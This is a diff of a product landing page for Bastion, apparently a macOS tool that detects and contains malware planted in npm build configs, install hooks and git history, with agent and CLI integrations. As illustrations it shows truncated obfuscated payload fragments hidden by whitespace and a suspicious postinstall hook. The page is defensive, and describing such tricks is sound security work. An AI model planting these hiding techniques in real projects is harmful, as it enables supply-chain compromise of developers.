-            <p class="parts"><a href="#respond"><b>3.1</b>Investigate</a><a href="#respond"><b>3.2</b>Contain</a><a href="#respond"><b>3.3</b>Verify</a><a href="#respond"><b>3.4</b>Report</a></p>
-          </li>
-          <li class="layer" data-ring="4">
-            <span class="layer-num">4.0</span>
-            <h3 class="h3">Scan</h3>
-            <p>A structural scan of config files, source files, install hooks, editor tasks, dependencies, CI workflows and every branch. On demand, at login and every few hours.</p>
-            <p class="parts"><span><b>4.1</b>Structural scan</span><a href="#history-hunt"><b>4.2</b>History hunt</a></p>
-          </li>
-        </ol>
-      </div>
-    </div>
-  </section>
-
-  <section class="section ruled" id="respond">
-    <div class="wrap">
-      <div class="head-split">
-        <div>
-          <p class="eyebrow"><b>3.0</b>Respond</p>
-          <h2 class="h2 grad">It works the incident like a security engineer would</h2>
+      <div class="spots">
+        <div class="spot">
+          <div class="file"><code>postcss.config.js</code><code>vite.config.ts</code><code>next.config.mjs</code></div>
+          <h3>Build configs</h3>
+          <p>Run the moment you type <code>npm run dev</code>, <code>build</code> or <code>test</code>.</p>
+          <pre class="snip">};<span class="mute">  ··· 2,000 spaces ···  </span><span class="red">global.o='1-183';…</span></pre>
         </div>
-        <div>
-          <p class="lead">Which commit brought the payload in, and who committed it. Whether it ever ran. Which branches carry it. What else that identity touched. Then it fixes what it can prove and hands you a short to-do list for the rest.</p>
-          <a class="mono-link" href="#cli">bastion respond
-            <svg width="13" height="13" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 8h10M9 4l4 4-4 4"/></svg>
-          </a>
+        <div class="spot">
+          <div class="file"><code>package.json</code><code>node_modules</code></div>
+          <h3>Install scripts</h3>
+          <p>Run on <code>npm install</code>, in your project or in a package deep inside <code>node_modules</code>.</p>
+          <pre class="snip">"postinstall": <span class="red">"node setup_bun.js"</span></pre>
         </div>
-      </div>
-
-      <div class="fig-panel">
-        <span class="fig-tag" aria-hidden="true">FIG 2</span>
-        <ol class="steps">
-          <li class="step">
-            <span class="step-num">3.1</span>
-            <h3>Investigate</h3>
-            <p>A fresh scan, then git history for every infected file: the last clean version, the commit and identity that planted the payload, and every branch that carries it. It checks whether the payload ever ran.</p>
-          </li>
-          <li class="step">
-            <span class="step-num">3.2</span>
-            <h3>Contain</h3>
-            <p>Only steps it can prove and undo. It removes injected code when the file then matches its last clean commit byte for byte, stops loaders, quarantines leftovers and blocks addresses found in the payload.</p>
-          </li>
-          <li class="step">
-            <span class="step-num">3.3</span>
-            <h3>Verify</h3>
-            <p>Scans again to confirm.</p>
-          </li>
-          <li class="step">
-            <span class="step-num">3.4</span>
-            <h3>Report</h3>
-            <p>An incident with what happened, whether it ran, what Bastion did, and your to-dos with the exact commands.</p>
-          </li>
-        </ol>
-        <div class="fig-shot">
-          <img src="assets/window-incident.webp" width="2360" height="1520" alt="An incident in Bastion: contained an attack on 1 repo, removed injected code from 1 file and blocked 1 address. postcss.config.mjs was planted in commit c523326b by jdoe-contrib and is on main, release/1.4 and their pushed copies. Below are the to-dos with git commands.">
-        </div>
-      </div>
-
-      <div class="respond-foot">
-        <fieldset class="foot-card modes">
-          <legend class="foot-label">Auto-respond</legend>
-          <div class="seg">
-            <input type="radio" name="autonomy" id="mode-contain" value="contain" checked><label for="mode-contain">Contain</label>
-            <input type="radio" name="autonomy" id="mode-observe" value="observe"><label for="mode-observe">Observe</label>
-            <input type="radio" name="autonomy" id="mode-off" value="off"><label for="mode-off">Off</label>
-          </div>
-          <p class="mode-desc d-contain">The default. Investigates, takes the proven, reversible steps and reports.</p>
-          <p class="mode-desc d-observe">Investigates and reports. Changes nothing on its own.</p>
-          <p class="mode-desc d-off">Nothing runs on its own. Findings are still reported.</p>
-        </fieldset>
-        <div class="foot-card">
-          <p class="foot-label">Always left to you</p>
-          <ul class="chips">
-            <li>Commits</li>
-            <li>Pushes</li>
-            <li>Deleting a branch</li>
-            <li>Changing anyone’s access</li>
-            <li>Files with your unsaved edits</li>
-          </ul>
-          <p class="foot-note">Bastion never does these. They become to-dos, with the exact commands.</p>
+        <div class="spot">
+          <div class="file"><code>origin/release/1.4</code><code>.github/workflows</code></div>
+          <h3>Old branches and CI</h3>
+          <p>Wait on a branch nobody deleted until someone checks it out, or ship your secrets out from CI.</p>
+          <pre class="snip"><span class="mute">$</span> git switch release/1.4</pre>
         </div>
       </div>
     </div>
   </section>
 
-  <section class="section ruled" id="guards">
+  <hr class="rule">
+
+  <section id="how">
     <div class="wrap">
       <div class="head">
-        <p class="eyebrow">The guards</p>
-        <h2 class="h2 grad">Every way in has a guard</h2>
-        <p class="lead">A payload can arrive through a dev server, an install, a pull request or an old branch. Bastion checks each one before it can run.</p>
+        <p class="eyebrow">How Bastion protects you</p>
+        <h2>Stops it. Proves it. <em>Fixes it.</em></h2>
       </div>
-
-      <div class="bento">
-        <article class="card card-wide" id="exec-guard">
-          <div class="demo demo-exec" aria-hidden="true">
-            <div class="notif">
-              <img src="assets/icon.png" width="30" height="30" alt="">
-              <div>
-                <p class="notif-title">🛡 Bastion — prevented execution <span>now</span></p>
-                <p>Blocked npm: injected config in ~/code/storefront/postcss.config.mjs</p>
-              </div>
-            </div>
-            <p><span class="t-faint">~/code/storefront $</span> npm run dev</p>
-            <p class="t-bad">🛡 Bastion blocked 'npm run dev' — injected config: ~/code/storefront/postcss.config.mjs</p>
-            <p class="t-dim">   Clean the file before running (git checkout from a trusted branch, or fix by hand).</p>
+      <div class="trio">
+        <article class="tile">
+          <div class="demo">
+            <pre class="term"><span class="pr">$</span> npm run dev
+<span class="no">✕ blocked</span> — injected build config in postcss.config.js
+<span class="pr">$</span> git push
+<span class="no">✕ blocked</span> — payload in a pushed commit
+<span class="pr">$</span> bastion check &amp;&amp; npm install
+<span class="ok">✓ safe to run on main</span></pre>
           </div>
-          <div class="card-text">
-            <p class="card-num">1.1</p>
-            <h3 class="h3">Execution guard</h3>
-            <p>node, npm, npx, pnpm, yarn and bun refuse to run in an infected project. Everywhere else they run as usual.</p>
+          <div class="copy">
+            <h3>Stops it before it runs</h3>
+            <p>npm, pnpm, yarn and bun refuse to start in an infected project, git refuses to push one, and your AI agent is stopped too.</p>
           </div>
         </article>
-
-        <article class="card" id="deps-guard">
-          <ul class="demo" aria-hidden="true">
-            <li class="dep"><p class="dep-name"><span>node_modules</span>@demo/color-kit</p><span class="sev sev-critical">critical</span><p class="dep-why">postinstall downloads and runs code</p></li>
-            <li class="dep"><p class="dep-name"><span>lockfile</span>@demo/logger 2.4.1</p><span class="sev sev-high">high</span><p class="dep-why">resolved from 203.0.113.9 over plain http</p></li>
-            <li class="dep"><p class="dep-name"><span>osv.dev</span>@demo/utils 1.0.3</p><span class="sev sev-critical">critical</span><p class="dep-why">known malicious version</p></li>
-          </ul>
-          <div class="card-text">
-            <p class="card-num">1.2</p>
-            <h3 class="h3">Dependency guard</h3>
-            <p>Every install is checked first, whether you, a script or an agent started it.</p>
-            <p class="fine">The osv.dev check is opt-in and sends package names and versions only.</p>
+        <article class="tile">
+          <div class="demo">
+            <p class="proof">postcss.config.js: Line 8 looks like “};”, but 2,000 blank characters push hidden code off-screen. It starts at column 2,003: <span class="red">global.o='1-183';var _$_d8bf=…</span></p>
+            <div class="chips"><span class="chip">See it on GitHub</span><span class="chip">Copy command to see it</span></div>
+          </div>
+          <div class="copy">
+            <h3>Proves every finding</h3>
+            <p>No vague alarms. Each finding names the line and column, links to it on GitHub, and gives you a command to see the hidden code yourself.</p>
           </div>
         </article>
-
-        <article class="card" id="pr-guard">
-          <div class="demo" aria-hidden="true">
-            <p class="check"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" stroke="#EB5757" stroke-width="1.8" stroke-linecap="round"><path d="M4.5 4.5l7 7M11.5 4.5l-7 7"/></svg><span class="check-name"><b>Bastion</b> / bastion (pull_request)</span><span class="check-meta">Failing</span></p>
-            <p class="annot"><b>postcss.config.mjs</b><br>Injected build config. Do not merge.</p>
-            <p class="check"><svg width="16" height="16" viewBox="0 0 16 16" fill="none" stroke="#4CB782" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M3.5 8.5l3 3 6-7"/></svg><span class="check-name"><b>CI</b> / test (pull_request)</span><span class="check-meta">Passing</span></p>
-          </div>
-          <div class="card-text">
-            <p class="card-num">1.4</p>
-            <h3 class="h3">Team PR guard</h3>
-            <p>A GitHub Action fails any pull request that carries a payload. False alarms are ignored from the base branch, so a pull request can’t silence its own findings.</p>
-            <p class="fine">Add it with <span class="c">bastion ci-setup --write</span></p>
-          </div>
-        </article>
-
-        <article class="card card-wide" id="history-hunt">
-          <div class="demo demo-history" aria-hidden="true">
-            <div class="graph-scroll">
-              <svg class="git-graph" viewBox="0 0 660 156">
-                <path class="lane" d="M16 40H540"/>
-                <path class="lane" d="M300 40C335 40 335 86 370 86H540"/>
-                <path class="lane lane-gone" d="M150 40C185 40 185 128 220 128H380"/>
-                <circle class="cm" cx="40" cy="40" r="6"/>
-                <circle class="cm" cx="110" cy="40" r="6"/>
-                <circle class="cm cm-bad" cx="220" cy="40" r="6"/>
-                <circle class="cm" cx="290" cy="40" r="6"/>
-                <circle class="cm" cx="380" cy="40" r="6"/>
-                <circle class="cm" cx="470" cy="40" r="6"/>
-                <circle class="cm" cx="430" cy="86" r="6"/>
-                <circle class="cm" cx="510" cy="86" r="6"/>
-                <circle class="cm cm-gone" cx="300" cy="128" r="6"/>
-                <text class="g-bad" x="220" y="20" text-anchor="middle">c523326b</text>
-                <text class="g-bad" x="300" y="152" text-anchor="middle">9f1c07e2</text>
-                <text x="552" y="44">main</text>
-                <text x="552" y="90">release/1.4</text>
-                <text x="392" y="132">deleted branch</text>
-              </svg>
-            </div>
-            <p><span class="t-bad">✗</span> 1 commit brought a payload in; 4 branch tips still carry one; 1 left over from deleted branches.</p>
-            <p><span class="t-bad">  +</span> c523326b postcss.config.mjs <span class="t-dim"> by jdoe-contrib &lt;contrib@example.net&gt; · in main, release/1.4</span></p>
-          </div>
-          <div class="card-text">
-            <p class="card-num">4.2</p>
-            <h3 class="h3">History hunt</h3>
-            <p>A clean working tree doesn’t mean a clean repo. Bastion searches every commit on every branch, the reflog and objects left over from deleted branches, and names the commit and identity that planted the payload.</p>
-          </div>
-        </article>
-      </div>
-    </div>
-  </section>
-
-  <section class="section ruled" id="agents">
-    <div class="wrap">
-      <div class="head-split">
-        <div>
-          <p class="eyebrow">For AI agents</p>
-          <h2 class="h2 grad">Your coding agent checks with Bastion first</h2>
-        </div>
-        <p class="lead">Bastion is an MCP server. Agents ask it whether a repository is safe before they run install, dev, build or test, and hand anything suspicious to the responder.</p>
-      </div>
-
-      <div class="agents-grid">
-        <div class="window">
-          <div class="window-bar"><span class="dots" aria-hidden="true"><i></i><i></i><i></i></span><span>agent session · ~/code/storefront</span></div>
-          <div class="session">
-            <p class="s-user">Set up storefront and start the dev server</p>
-            <div class="s-tool">
-              <p class="s-call"><b>bastion_check_path</b>~/code/storefront</p>
-              <p class="s-out t-bad">✗ not safe to run install/dev/build</p>
-              <p class="s-out">Injected build config — postcss.config.mjs</p>
-            </div>
-            <div class="s-tool">
-              <p class="s-call"><b>bastion_respond</b>~/code/storefront</p>
-              <p class="s-out t-ok">✓ contained · removed injected code from 1 file, blocked 1 address</p>
-              <p class="s-out">5 to-dos · INC-20260924-210433</p>
-            </div>
-            <p class="s-reply">I didn’t start the dev server. postcss.config.mjs carried a hidden payload, planted in c523326b by jdoe-contrib. Bastion removed it and blocked 203.0.113.77. Your first to-do is to commit the cleaned file.</p>
-          </div>
-        </div>
-
-        <div class="side">
-          <div class="panel-card">
-            <h3 class="h3">Connect your agent</h3>
-            <div class="tablist" role="tablist" aria-label="Agent">
-              <button class="tab" type="button" role="tab" id="tab-claude" aria-selected="true" aria-controls="panel-claude">Claude Code</button>
-              <button class="tab" type="button" role="tab" id="tab-cursor" aria-selected="false" aria-controls="panel-cursor" tabindex="-1">Cursor, Claude Desktop, Windsurf</button>
-              <button class="tab" type="button" role="tab" id="tab-codex" aria-selected="false" aria-controls="panel-codex" tabindex="-1">Codex CLI</button>
-            </div>
-            <div class="tabpanel" role="tabpanel" id="panel-claude" aria-labelledby="tab-claude">
-              <p class="panel-note">Run this once:</p>
-              <div class="code-block">
-                <pre><code id="code-claude">claude mcp add --scope user bastion -- ~/.security-guard/bin/bastion mcp</code></pre>
-                <button class="copy" type="button" data-copy="code-claude"><span>Copy</span></button>
-              </div>
-            </div>
-            <div class="tabpanel" role="tabpanel" id="panel-cursor" aria-labelledby="tab-cursor" hidden>
-              <p class="panel-note">Add Bastion to the app’s <span class="c">mcpServers</span>. For Cursor that’s <span class="c">~/.cursor/mcp.json</span>. Use your full home path.</p>
-              <div class="code-block">
-                <pre><code id="code-cursor">{
-  "mcpServers": {
-    "bastion": {
-      "command": "/Users/you/.security-guard/bin/bastion",
-      "args": ["mcp"]
-    }
-  }
-}</code></pre>
-                <button class="copy" type="button" data-copy="code-cursor"><span>Copy</span></button>
-              </div>
-            </div>
-            <div class="tabpanel" role="tabpanel" id="panel-codex" aria-labelledby="tab-codex" hidden>
-              <p class="panel-note">In <span class="c">~/.codex/config.toml</span>:</p>
-              <div class="code-block">
-                <pre><code id="code-codex">[mcp_servers.bastion]
-command = "/Users/you/.security-guard/bin/bastion"
-args = ["mcp"]</code></pre>
-                <button class="copy" type="button" data-copy="code-codex"><span>Copy</span></button>
-              </div>
-            </div>
-          </div>
-
-          <div class="panel-card">
-            <h3 class="h3">What agents can do</h3>
-            <ul>
-              <li class="tool-row"><code>bastion_check_path</code><span>Is it safe to run npm here? Usually answers in under a second.</span></li>
-              <li class="tool-row"><code>bastion_respond</code><span>Investigates, contains what it can prove, with undo, and returns an incident report.</span></li>
-              <li class="tool-row"><code>bastion_deps</code><span>Checks a project’s dependencies.</span></li>
-              <li class="tool-row"><code>bastion_history</code><span>Hunts a repo’s git history for planted payloads.</span></li>
-              <li class="tool-row"><code>bastion_enable</code><span>Turns a protection on. There is no tool to turn one off.</span></li>
+        <article class="tile">
+          <div class="demo">
+            <ul class="fixes">
+              <li><span>Commit the fix on main</span><b>Commit fix…</b></li>
+              <li><span>Delete the old branch release/1.4 — main is clean</span><b>Delete branch…</b></li>
+              <li class="done"><span>Update your local main</span><b>✓ Fixed</b></li>
             </ul>
           </div>
-        </div>
-      </div>
-
-      <div class="agents-row">
-        <div class="panel-card" id="hard-guard">
-          <p class="card-num">1.5</p>
-          <h3 class="h3">Hard-guard, for when an agent skips the check</h3>
-          <p>A hook runs before every shell command the agent starts, and blocks install, dev, build or test in a project that isn’t safe. The agent is told why and what to do instead.</p>
-          <div class="guard-out">
-            <p><span class="t-faint">$</span> npm install</p>
-            <p class="t-bad">Bastion blocked this command: ~/code/storefront is not safe to run.</p>
-            <p>• Injected build config — ~/code/storefront/postcss.config.mjs</p>
-            <p class="t-dim">Don’t run install, dev, build or test here. Tell the user, and suggest bastion respond ~/code/storefront to investigate and contain it.</p>
+          <div class="copy">
+            <h3>Fixes it in one click</h3>
+            <p>Every problem comes with the fix that fits it. Anything that touches GitHub asks first, and every file Bastion cleans can be undone.</p>
           </div>
-          <div class="code-block">
-            <pre><code id="code-hooks">bastion hooks install claude    # or cursor, or all</code></pre>
-            <button class="copy" type="button" data-copy="code-hooks"><span>Copy</span></button>
-          </div>
-          <p class="fine">Your settings are kept, with a backup next to the file. The hook never approves anything on its own.</p>
-        </div>
-        <div class="callout">
-          <h3 class="h3">Agents can make you safer, never less safe</h3>
-          <p>There’s no tool to switch protection off, trust a host, ignore a path, unblock an address or restore quarantined files. A confused or tricked agent can’t do those things either. They stay with you, and every change is logged and announced.</p>
-        </div>
+        </article>
       </div>
     </div>
   </section>
 
-  <section class="section ruled" id="cli">
-    <div class="wrap">
-      <div class="head-split">
-        <div>
-          <p class="eyebrow">Command line</p>
-          <h2 class="h2 grad">Scriptable down to the exit code</h2>
-        </div>
-        <p class="lead">Every check is one command, and <span class="c">--json</span> gives you machine-readable output. So <span class="c">bastion check &amp;&amp; npm install</span> works in scripts and CI.</p>
-      </div>
+  <hr class="rule">
 
-      <div class="window term">
-        <div class="window-bar">
-          <span class="dots" aria-hidden="true"><i></i><i></i><i></i></span>
-          <div class="tablist" role="tablist" aria-label="Command">
-            <button class="tab" type="button" role="tab" id="tab-check" aria-selected="true" aria-controls="term-check">check</button>
-            <button class="tab" type="button" role="tab" id="tab-respond" aria-selected="false" aria-controls="term-respond" tabindex="-1">respond</button>
-            <button class="tab" type="button" role="tab" id="tab-history" aria-selected="false" aria-controls="term-history" tabindex="-1">history</button>
-            <button class="tab" type="button" role="tab" id="tab-status" aria-selected="false" aria-controls="term-status" tabindex="-1">status</button>
-          </div>
-        </div>
-        <div class="term-body" role="tabpanel" id="term-check" aria-labelledby="tab-check">
-          <p class="cmd">cd ~/code/storefront &amp;&amp; bastion check</p>
-          <p class="t-bad">✗ not safe to run install/dev/build in ~/code/storefront</p>
-          <p>  <span class="t-bad">✗</span> <span class="t-bad">[critical]</span> Injected build config</p>
-          <p>    postcss.config.mjs  <span class="t-dim">payload signs: campaign-marker, string-scrambler</span></p>
-          <p>    <span class="t-dim">why:</span> A build config file (postcss, vite, next, tailwind, orval…) carries an obfuscated payload. Build tools execute their config files, so running dev, build, test or codegen here would run the malware.</p>
-          <p>    <span class="t-dim">fix:</span> Don’t run install/dev/build/test in this repo. git log -p -- postcss.config.mjs shows who changed the file.</p>
-          <p class="cmd">echo $?</p>
-          <p>2</p>
-        </div>
-        <div class="term-body" role="tabpanel" id="term-respond" aria-labelledby="tab-respond" hidden>
-          <p class="cmd">bastion respond</p>
-          <p class="t-dim">investigating — scan, git history, processes, network…</p>
-          <p><span class="t-ok">✓ contained</span>  Contained an attack on 1 repo — removed injected code from 1 file, blocked 1 address.</p>
-          <p>  <span class="t-ok">✓</span> removed injected code from postcss.config.mjs</p>
-          <p>  <span class="t-ok">✓</span> blocked 203.0.113.77</p>
-          <p> </p>
-          <p>your to-dos</p>
-          <p>  1. Commit the cleaned file in storefront <span class="t-dim">— Bastion fixed your working copy; git doesn’t have the fix yet.</span></p>
-          <p class="t-acc">       git -C "$HOME/code/storefront" add -- "postcss.config.mjs"</p>
-          <p>  2. Clean the pushed branches of storefront <span class="t-dim">— origin/main, origin/release/1.4 still carry the bad commit.</span></p>
-          <p>  3. Remove access for jdoe-contrib &lt;contrib@example.net&gt;</p>
-          <p class="t-dim">  …</p>
-          <p class="t-dim">report: ~/.security-guard/incidents/INC-20260924-210433/report.md   ·   bastion incident INC-20260924-210433</p>
-        </div>
-        <div class="term-body" role="tabpanel" id="term-history" aria-labelledby="tab-history" hidden>
-          <p class="cmd">bastion history</p>
-          <p class="t-dim">searching every branch, tag, stash and deleted branch…</p>
-          <p><span class="t-bad">✗</span> 1 commit brought a payload in; 4 branch tips still carry one; 1 left over from deleted branches.</p>
-          <p>  <span class="t-bad">+</span> c523326b postcss.config.mjs<span class="t-dim">  by jdoe-contrib &lt;contrib@example.net&gt; · Sep 24, 21:04 · in main, release/1.4</span></p>
-          <p>  <span class="t-warn">⎇</span> main: postcss.config.mjs</p>
-          <p>  <span class="t-warn">⎇</span> release/1.4: postcss.config.mjs</p>
-          <p>  <span class="t-warn">⎇</span> origin/main: postcss.config.mjs</p>
-          <p>  <span class="t-warn">⎇</span> origin/release/1.4: postcss.config.mjs</p>
-          <p class="t-dim">  ◌ 9f1c07e2 vite.config.ts — left over from a deleted branch</p>
-          <p class="t-dim">Remote branches are as of your last fetch. Run git fetch --all first to see the server’s current state.</p>
-        </div>
-        <div class="term-body" role="tabpanel" id="term-status" aria-labelledby="tab-status" hidden>
-          <p class="cmd">bastion status</p>
-          <p>bastion 4.1.0 · <span class="t-ok">protected ✓</span></p>
-          <p>  real-time watcher   <span class="t-ok">on</span></p>
-          <p>  scheduled scan      <span class="t-ok">on</span></p>
-          <p>  execution guard     <span class="t-ok">on</span></p>
-          <p>  git push guard      4 of 4 repos</p>
-          <p>  last scan           today 21:04 · <span class="t-ok">clean</span></p>
-          <p>  quarantine          <span class="t-warn">1 item</span></p>
-          <p>  auto-respond        <span class="t-ok">contain</span></p>
-          <p> </p>
-          <p><span class="t-ok">●</span> incident INC-20260924-210433<span class="t-dim">  contained · 5 to-do(s) · bastion incident</span></p>
-          <p>  Contained an attack on 1 repo — removed injected code from 1 file, blocked 1 address.</p>
-        </div>
-      </div>
-
-      <div class="exit-codes">
-        <div class="exit"><b class="t-ok">0</b><h3 class="h3">All good</h3><p>Nothing found. Carry on.</p></div>
-        <div class="exit"><b class="t-bad">2</b><h3 class="h3">Threats found</h3><p>Stop here. The output says why and what to run next.</p></div>
-        <div class="exit"><b class="t-warn">1</b><h3 class="h3">Error</h3><p>Bastion couldn’t finish the check.</p></div>
-      </div>
-    </div>
-  </section>
-
-  <section class="section ruled" id="principles">
+  <section id="app">
     <div class="wrap">
       <div class="head">
-        <p class="eyebrow">Principles</p>
-        <h2 class="h2 grad">Careful by default</h2>
-        <p class="lead">A security tool runs with your permissions. Bastion is built to deserve them.</p>
+        <p class="eyebrow">The app</p>
+        <h2>Always know what needs you</h2>
+        <p class="lede">One status and one list. Each item says how dangerous it is right now, shows the proof, and has the fix. The list updates the moment you fix something.</p>
       </div>
-      <div class="principles">
-        <div class="principle">
-          <svg width="22" height="22" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect x="3.5" y="4" width="13" height="9" rx="1.5"/><path d="M1.5 16h17"/></svg>
-          <h3 class="h3">Runs on your Mac</h3>
-          <p>Nothing is uploaded, unless you turn on the online malware check. That sends package names and versions only.</p>
-        </div>
-        <div class="principle">
-          <svg width="22" height="22" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 7V4.5A1.5 1.5 0 0 1 4.5 3H7M13 3h2.5A1.5 1.5 0 0 1 17 4.5V7M17 13v2.5a1.5 1.5 0 0 1-1.5 1.5H13M7 17H4.5A1.5 1.5 0 0 1 3 15.5V13M6 10h8"/></svg>
-          <h3 class="h3">Catches new variants</h3>
-          <p>It spots the shape of the trick rather than one exact virus, so new versions of an attack get caught too.</p>
-        </div>
-        <div class="principle">
-          <svg width="22" height="22" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M7.5 5 4 8.5 7.5 12"/><path d="M4 8.5h8a4 4 0 0 1 0 8H9"/></svg>
-          <h3 class="h3">Never destructive</h3>
-          <p>Nothing is deleted. Leftovers are quarantined and every file change has an undo: <span class="c">bastion undo</span>.</p>
-        </div>
-        <div class="principle">
-          <svg width="22" height="22" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 5.5 4.5 7 7 4.5M3 13l1.5 1.5L7 12M10 6h7M10 13.5h7"/></svg>
-          <h3 class="h3">Doesn’t cry wolf</h3>
-          <p>An allowlist for your own servers and an ignore list for docs and tests keep false alarms away.</p>
-        </div>
-        <div class="principle">
-          <svg width="22" height="22" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 8v4a1 1 0 0 0 1 1h2l6 3.5v-13L6 7H4a1 1 0 0 0-1 1z"/><path d="M15 7.5a3.5 3.5 0 0 1 0 5"/></svg>
-          <h3 class="h3">Loud about lowering protection</h3>
-          <p>Only you can turn a protection off, trust a host or restore a quarantined file. Every change is logged and announced.</p>
-        </div>
-        <div class="principle">
-          <kbd>⌘K</kbd>
-          <h3 class="h3">Keyboard-first app</h3>
-          <p>A menu-bar panel for a quick look and a full window for everything else. ⌘K opens the command menu and ⌘1–7 jump between pages.</p>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <section class="section ruled" id="limits">
-    <div class="wrap limits">
-      <div class="head">
-        <h2 class="h2 grad">Honest limits</h2>
-        <p class="lead">Bastion is a focused guard. Here’s what it doesn’t do.</p>
-      </div>
-      <div class="limit-list">
-        <div class="limit">
-          <h3 class="h3">It isn’t a full antivirus</h3>
-          <p>It targets this family of supply-chain attacks and the mess they leave. Keep a general scanner around too.</p>
-        </div>
-        <div class="limit">
-          <h3 class="h3">Brand-new packages can slip through</h3>
-          <p>A new package that hides its payload in ordinary library code can still get in. <span class="c">npm install --ignore-scripts</span> is the belt-and-braces option.</p>
-        </div>
-        <div class="limit">
-          <h3 class="h3">It protects your machine</h3>
-          <p>If malicious code keeps arriving in a shared repo, fix it at the source. The incident’s to-dos show you where.</p>
-        </div>
-        <div class="limit">
-          <h3 class="h3">Agents run with your permissions</h3>
-          <p>An agent that can run shell commands could, in principle, remove Bastion itself. Bastion makes lowering protection explicit and loud rather than impossible.</p>
-        </div>
-      </div>
-    </div>
-  </section>
-
-  <section class="section ruled download" id="download">
-    <div class="wrap dl">
-      <div class="dl-main">
-        <img class="dl-icon" src="assets/icon.png" width="72" height="72" alt="">
-        <h2 class="h2 grad">Put Bastion in front of your next npm install</h2>
-        <p class="lead">The first launch sets everything up in <span class="c">~/.security-guard</span>, including the <span class="c">bastion</span> command.</p>
-        <div class="hero-actions">
-          <a class="btn btn-primary" href="https://github.com/realanshuman/bastion/releases/latest">
-            <svg width="16" height="16" viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M8 2.5v8M4.5 7 8 10.5 11.5 7M3 13.5h10"/></svg>
-            Download Bastion.dmg
-          </a>
-          <a class="btn btn-ghost" href="https://github.com/realanshuman/bastion/releases">Release notes</a>
-        </div>
-        <p class="meta"><span>v4.1.0</span><span>macOS 14 or later</span><span>Apple silicon and Intel</span><span>MIT</span></p>
-        <p class="dl-note">Bastion is open source and self-signed, so macOS asks before the first launch. Right-click the app and choose Open.</p>
-        <div class="dl-source" id="source">
-          <p class="foot-label">Or build it from source</p>
-          <div class="code-block">
-            <pre><code id="code-source">git clone https://github.com/realanshuman/bastion.git
-cd bastion
-bash build.sh      # builds Bastion.app, the bastion CLI and a .dmg
-bash install.sh    # turns on the background protection</code></pre>
-            <button class="copy" type="button" data-copy="code-source"><span>Copy</span></button>
-          </div>
-        </div>
-      </div>
-      <figure class="dl-panel">
-        <img src="assets/panel-preview.webp" width="720" height="1200" alt="The Bastion menu-bar panel: You’re protected, attack contained with 5 to-dos, a Scan now button and switches for each protection.">
-        <figcaption>The shield in your menu bar</figcaption>
+      <figure class="shot">
+        <div class="ide-top"><span class="lights" aria-hidden="true"><i></i><i></i><i></i></span><span class="ide-file">Bastion</span></div>
+        <img src="assets/needs-you.jpg" width="2360" height="1520" loading="lazy" alt="The Bastion window on Incidents, Needs you: the storefront repo lists Commit the fix on main and Push the fix to origin/main, each with the proof line and a fix button.">
       </figure>
+      <div class="notes">
+        <div>
+          <h3>One status, everywhere</h3>
+          <div class="state"><span class="g">All clear</span><span class="o">3 to clean up</span><span class="r">Act now</span></div>
+          <p>The same answer in the window, the menu bar and its icon.</p>
+        </div>
+        <div>
+          <h3>Proof, then the fix</h3>
+          <p>Where the code hides, whether it's running, and the one fix that fits: commit, push, update or delete.</p>
+        </div>
+        <div>
+          <h3>Next steps</h3>
+          <p>A short checklist turns on the protections you haven't yet, most of them in one click.</p>
+        </div>
+      </div>
     </div>
   </section>
 
+  <hr class="rule">
+
+  <section id="developers">
+    <div class="wrap">
+      <div class="head center">
+        <p class="eyebrow">For developers</p>
+        <h2>Fits how you <em>already</em> work</h2>
+        <p class="lede">A command line, an MCP server for your AI agent, a GitHub Action and git hooks. Use one, or all of them.</p>
+      </div>
+      <div class="dev">
+        <div class="tabs" role="tablist" aria-label="Ways to use Bastion">
+          <button class="tab" type="button" role="tab" id="tab-cli" aria-selected="true" aria-controls="p-cli">Terminal</button>
+          <button class="tab" type="button" role="tab" id="tab-agents" aria-selected="false" aria-controls="p-agents" tabindex="-1">AI agents</button>
+          <button class="tab" type="button" role="tab" id="tab-action" aria-selected="false" aria-controls="p-action" tabindex="-1">GitHub Action</button>
+          <button class="tab" type="button" role="tab" id="tab-hooks" aria-selected="false" aria-controls="p-hooks" tabindex="-1">Git hooks</button>
+        </div>
+        <div class="panel" role="tabpanel" id="p-cli" aria-labelledby="tab-cli">
+          <button class="btn small copy-btn" type="button" data-copy="bastion check &amp;&amp; npm install">Copy</button>
+<pre><span class="cm"># Is it safe to install and run here?</span>
+<span class="pr">$ </span>bastion check &amp;&amp; npm install
+<span class="ok">✓ safe to run on main</span>
+
+<span class="cm"># What needs me, with proof and the fix</span>
+<span class="pr">$ </span>bastion todos
+<span class="or">● dormant</span>  Delete the old branch release/1.4 — main is clean
+  proof: postcss.config.mjs: Line 8 looks like “};”, but 2,000 blank
+         characters push hidden code off-screen, from column 2,003
+  one step: bastion fix 3k9x2ab --yes</pre>
+        </div>
+        <div class="panel" role="tabpanel" id="p-agents" aria-labelledby="tab-agents" hidden>
+          <button class="btn small copy-btn" type="button" data-copy="claude mcp add --scope user bastion -- ~/.security-guard/bin/bastion mcp">Copy</button>
+<pre><span class="cm"># Claude Code: your agent checks a repo before it runs npm there</span>
+<span class="pr">$ </span>claude mcp add --scope user bastion -- ~/.security-guard/bin/bastion mcp
+
+<span class="cm"># Hard-guard: block install, dev, build and test in an unsafe repo</span>
+<span class="pr">$ </span>bastion hooks install claude   <span class="cm"># or cursor</span>
+
+<span class="cm"># Cursor, Claude Desktop, Windsurf and Codex: one command each</span>
+<span class="pr">$ </span>bastion connect cursor --write
+
